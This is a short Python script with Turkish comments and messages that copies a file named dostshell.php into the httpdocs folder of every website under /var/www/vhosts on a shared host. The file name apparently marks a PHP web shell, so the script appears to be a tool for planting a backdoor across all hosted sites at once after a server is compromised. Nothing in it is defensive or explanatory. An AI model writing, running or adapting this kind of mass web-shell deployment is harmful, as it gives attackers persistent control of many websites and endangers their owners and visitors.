import glob
import shutil

# Kaynak dosyanın yolu
source_file = '/var/www/vhosts/dostshell.php'

# Hedef dizinleri bul ve dosyayı kopyala
for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
    try:
        shutil.copy(source_file, target_dir)
        print(f"{source_file} kopyalandı -> {target_dir}")
    except Exception as e:
        print(f"Hata: {target_dir} içine kopyalanamadı. {e}")
